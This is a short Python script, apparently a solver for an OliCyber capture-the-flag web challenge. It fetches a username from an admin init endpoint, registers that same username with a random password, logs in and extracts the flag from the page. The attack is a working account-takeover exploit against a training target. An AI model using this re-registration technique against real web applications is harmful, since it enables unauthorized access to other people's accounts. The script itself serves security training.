from bs4 import BeautifulSoup
import requests
import random
import string
import re

def generate_random_password(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

base_url = "http://zio-frank.challs.olicyber.it"
init_url = f"{base_url}/admin/init"
register_url = f"{base_url}/register"
login_url = f"{base_url}/login"

# print("inizializzazione del server")
init_response = requests.post(init_url)
if init_response.status_code != 200:
    print(init_response.text)
    exit()

try:
    username = init_response.json().get("username")
    if not username:
        raise ValueError(" 'username' non trovato nella risposta JSON.")
except ValueError as e:
    print(init_response.text)
    exit()

password = generate_random_password()

register_data = {
    "username": username,
    "password": password,
    "password2": password
}

# print("registrazione")
register_response = requests.post(register_url, data=register_data)
if register_response.status_code != 200:
    print("Errore durante la registrazione.")
    print(register_response.text)
    exit()

# print("registrato")

login_data = {
    "username": username,
    "password": password
}

# print("loggin in")
login_response = requests.post(login_url, data=login_data)
if login_response.status_code != 200:
    # print("errore durante il login.")
    print(login_response.text)
    exit()

soup = BeautifulSoup(login_response.text, 'html.parser')

lines_with_flag = [str(tag) for tag in soup.find_all(string=lambda t: 'flag' in t.lower())]

if lines_with_flag:
    for line in lines_with_flag:
        flag = re.findall(r'flag\{.*?}', line)
        if flag:
            print(flag[0])
else:
    print("skill issue ig")
